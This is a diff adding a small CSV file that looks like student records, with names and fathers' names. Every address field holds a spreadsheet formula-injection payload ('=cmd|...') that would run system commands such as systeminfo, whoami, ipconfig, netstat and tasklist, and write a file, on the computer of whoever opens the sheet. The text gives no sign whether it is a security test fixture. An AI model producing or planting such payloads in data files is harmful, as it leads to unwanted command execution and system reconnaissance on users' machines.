@@ -1,0 +1,10 @@
+student name,father name,address
+Emma Brown,Chris Doe,"=cmd|'systeminfo'"
+Noah Davis,Andy Smith,"=cmd|'whoami'"
+Liam Wilson,Joseph Lee,"=cmd|'ipconfig'"
+Olivia Martin,Samuel Hall,"=cmd|'netstat'"
+Ava White,David Johnson,"=cmd|'dir'"
+Mia Harris,Ethan Clark,"=cmd|'dir /B'"
+James Anderson,Kevin Lee,"=cmd|'tasklist'"
+Benjamin Carter,Daniel Hill,"=cmd|'echo Custom message from server > log.txt'"
+
